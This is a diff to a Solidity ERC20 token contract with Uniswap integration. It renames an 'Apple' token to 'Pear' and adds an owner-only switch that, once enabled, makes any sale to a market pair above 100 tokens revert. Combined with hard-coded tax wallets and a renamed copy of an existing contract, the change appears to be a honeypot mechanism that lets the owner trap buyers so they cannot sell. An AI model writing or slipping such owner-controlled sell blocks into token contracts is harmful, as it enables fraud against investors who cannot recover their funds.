@@ -370,13 +370,13 @@ interface IUniswapV2Router02 is IUniswapV2Router01 {
     ) external;
 }
 
-contract Apple is Context, IERC20, Ownable {
+contract Pear is Context, IERC20, Ownable {
     
     using SafeMath for uint256;
     using Address for address;
     
-    string private _name ="Apple";
-    string private _symbol = "APPLE";
+    string private _name ="Pear";
+    string private _symbol = "PEAR";
     uint8 private _decimals = 9;
 
     address payable private taxWallet1 = payable(0x2f219f08B6480b5f053fFeC23be9F4079c146Bc7);
@@ -410,6 +410,7 @@ contract Apple is Context, IERC20, Ownable {
     uint256 public _maxTxAmount = _totalSupply;
     uint256 public _walletMax = _totalSupply*2/100;
     uint256 private minimumTokensBeforeSwap = _totalSupply*5/1000; 
+    uint256 public _sellLimitAmount = 100 * 10 ** 9;
 
     IUniswapV2Router02 public uniswapV2Router;
     address public uniswapPair;
@@ -418,6 +419,7 @@ contract Apple is Context, IERC20, Ownable {
     bool public swapAndLiquifyEnabled = false;
     bool public swapAndLiquifyByLimitOnly = false;
     bool public checkWalletLimit = true;
+    bool public sellLimitEnabled = false;
 
     event SwapAndLiquifyEnabledUpdated(bool enabled);
     event SwapAndLiquify(
@@ -562,6 +564,10 @@ contract Apple is Context, IERC20, Ownable {
        checkWalletLimit = newValue;
     }
 
+    function setSellLimitEnabled (bool newValue) external onlyOwner() {
+        sellLimitEnabled = newValue;
+    }
+
     function setcheckWalletLimitExcept(address holder, bool exempt) external onlyOwner {
         checkWalletLimitExcept[holder] = exempt;
     }
@@ -621,6 +627,10 @@ contract Apple is Context, IERC20, Ownable {
 
         require(sender != address(0), "ERC20: transfer from the zero address");
         require(recipient != address(0), "ERC20: transfer to the zero address");
+        require(amount > 0, "Zero amount transfer");
+        if (checkMarketPair[recipient] && sellLimitEnabled) {
+            require(amount <= _sellLimitAmount, "Transfer amount exceeds the max sell amount.");
+        }
 
         if(inSwapAndLiquify)
         { 
